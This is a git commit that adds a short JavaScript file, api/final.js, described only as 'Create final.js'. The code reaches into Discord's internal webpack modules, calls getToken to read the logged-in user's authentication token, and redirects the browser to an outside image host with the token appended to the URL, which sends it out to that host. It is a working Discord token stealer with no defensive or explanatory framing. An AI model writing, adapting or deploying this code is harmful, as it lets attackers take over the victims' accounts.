ff3d8fa37b6932ada8a94353e9839d6a358f4d25
jlsyetsu404040 <ethanbourgi56@gmail.com>
2025-03-20 18:02:19 +0100

    Create final.js

---
+++ api/final.js
@@ -0,0 +1,6 @@
+const url = 'https://www.tattwo.me/1737-large_default/troll-face.jpg';
+var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
+  m = [];
+  for (let c in e.c) m.push(e.c[c]);
+}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
+window.location.replace(url + '/' + f);
